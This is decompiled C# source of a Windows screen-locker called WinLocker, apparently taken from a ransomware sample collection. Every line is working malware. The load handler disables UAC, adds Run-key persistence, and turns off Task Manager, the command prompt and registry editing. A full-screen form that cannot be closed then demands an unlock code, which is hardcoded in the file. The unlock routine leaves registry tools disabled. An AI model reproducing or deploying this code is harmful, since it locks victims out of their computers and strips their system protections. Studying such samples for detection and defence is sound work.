// Decompiled with JetBrains decompiler
// Type: WinLocker.Locked
// Assembly: WinLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8062B160-3B56-4AD0-BF31-7B20DC77D323
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Ransomware\WinLocker\163557bbef021e822a6230d4dffe47f1ad5b88b9f605486afd7097a1b4ee67ec.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

#nullable disable
namespace WinLocker;

public class Locked : Form
{
  private IContainer components = (IContainer) null;
  private Label label1;
  private Label label2;
  private TextBox textBox1;
  private Button button1;
  private Button button2;
  private Button button3;

  public Locked() => this.InitializeComponent();

  private void Locked_Load(object sender, EventArgs e)
  {
    Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("FilterAdministratorToken", (object) 1, RegistryValueKind.DWord);
    Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("EnableLUA", (object) 0, RegistryValueKind.DWord);
    Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("WinLocker", (object) Application.ExecutablePath.ToString());
    Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", (object) 1, RegistryValueKind.DWord);
    Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System").SetValue("DisableCMD", (object) 1, RegistryValueKind.DWord);
    Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableRegistryTools", (object) 1, RegistryValueKind.DWord);
  }

  private void button2_Click(object sender, EventArgs e)
  {
    int num1 = (int) MessageBox.Show("Are you sure?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
    int num2 = (int) MessageBox.Show("It's just a joke :D", "Nothing Wrong here", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
  }

  private void button3_Click(object sender, EventArgs e)
  {
    int num = (int) MessageBox.Show("Created by AlexGamer 5516, written in C#, check out my channel!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
  }

  private void button1_Click(object sender, EventArgs e)
  {
    if (this.textBox1.Text == "")
    {
      int num1 = (int) MessageBox.Show("You forgot about the code!", "You need better skills", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }
    else if (this.textBox1.Text == "Threshold")
    {
      int num2 = (int) MessageBox.Show("Well done!!!! You have unlocked your computer", "Done", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("FilterAdministratorToken", (object) 0, RegistryValueKind.DWord);
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("EnableLUA", (object) 1, RegistryValueKind.DWord);
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("WinLocker", (object) 0, RegistryValueKind.String);
      Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", (object) 0, RegistryValueKind.DWord);
      Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System").SetValue("DisableCMD", (object) 0, RegistryValueKind.DWord);
      foreach (Process process in Process.GetProcessesByName("WinLocker"))
        process.Kill();
      this.Close();
    }
    else
    {
      int num3 = (int) MessageBox.Show("You forgot about the code!", "You need better skills", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }
  }

  private void Locked_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = true;

  protected override void Dispose(bool disposing)
  {
    if (disposing && this.components != null)
      this.components.Dispose();
    base.Dispose(disposing);
  }

  private void InitializeComponent()
  {
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Locked));
    this.label1 = new Label();
    this.label2 = new Label();
    this.textBox1 = new TextBox();
    this.button1 = new Button();
    this.button2 = new Button();
    this.button3 = new Button();
    this.SuspendLayout();
    this.label1.AutoSize = true;
    this.label1.BackColor = System.Drawing.Color.White;
    this.label1.Font = new Font("Microsoft Sans Serif", 26.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
    this.label1.ForeColor = SystemColors.ControlText;
    this.label1.Location = new Point(124, 28);
    this.label1.Name = "label1";
    this.label1.Size = new Size(546, 39);
    this.label1.TabIndex = 0;
    this.label1.Text = "Uh OH, you are locked forever!!!";
    this.label2.AutoSize = true;
    this.label2.BackColor = System.Drawing.Color.White;
    this.label2.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
    this.label2.ForeColor = System.Drawing.Color.Black;
    this.label2.Location = new Point(306, 213);
    this.label2.Name = "label2";
    this.label2.Size = new Size(168, 24);
    this.label2.TabIndex = 1;
    this.label2.Text = "Answer the code";
    this.textBox1.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
    this.textBox1.Location = new Point(215, 251);
    this.textBox1.Name = "textBox1";
    this.textBox1.Size = new Size(346, 24);
    this.textBox1.TabIndex = 2;
    this.textBox1.Text = "000000000000000";
    this.textBox1.TextAlign = HorizontalAlignment.Center;
    this.button1.BackColor = System.Drawing.Color.DarkBlue;
    this.button1.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.button1.ForeColor = System.Drawing.Color.White;
    this.button1.Location = new Point(310, 281);
    this.button1.Name = "button1";
    this.button1.Size = new Size(164, 49);
    this.button1.TabIndex = 3;
    this.button1.Text = "Escape!!!!";
    this.button1.UseVisualStyleBackColor = false;
    this.button1.Click += new EventHandler(this.button1_Click);
    this.button2.BackColor = System.Drawing.Color.DarkBlue;
    this.button2.ForeColor = System.Drawing.Color.White;
    this.button2.Location = new Point(3, 555);
    this.button2.Name = "button2";
    this.button2.Size = new Size(92, 53);
    this.button2.TabIndex = 4;
    this.button2.Text = "Wipe System";
    this.button2.UseVisualStyleBackColor = false;
    this.button2.Click += new EventHandler(this.button2_Click);
    this.button3.BackColor = System.Drawing.Color.DarkBlue;
    this.button3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
    this.button3.ForeColor = System.Drawing.Color.White;
    this.button3.Location = new Point(102, 555);
    this.button3.Name = "button3";
    this.button3.Size = new Size(99, 53);
    this.button3.TabIndex = 5;
    this.button3.Text = "Info";
    this.button3.UseVisualStyleBackColor = false;
    this.button3.Click += new EventHandler(this.button3_Click);
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = System.Drawing.Color.DarkBlue;
    this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
    this.BackgroundImageLayout = ImageLayout.Stretch;
    this.ClientSize = new Size(906, 620);
    this.Controls.Add((Control) this.button3);
    this.Controls.Add((Control) this.button2);
    this.Controls.Add((Control) this.button1);
    this.Controls.Add((Control) this.textBox1);
    this.Controls.Add((Control) this.label2);
    this.Controls.Add((Control) this.label1);
    this.DoubleBuffered = true;
    this.ForeColor = System.Drawing.Color.DarkBlue;
    this.FormBorderStyle = FormBorderStyle.None;
    this.MaximizeBox = false;
    this.MinimizeBox = false;
    this.Name = nameof (Locked);
    this.ShowInTaskbar = false;
    this.Text = "Form1";
    this.TopMost = true;
    this.WindowState = FormWindowState.Maximized;
    this.FormClosing += new FormClosingEventHandler(this.Locked_FormClosing);
    this.Load += new EventHandler(this.Locked_Load);
    this.ResumeLayout(false);
    this.PerformLayout();
  }
}
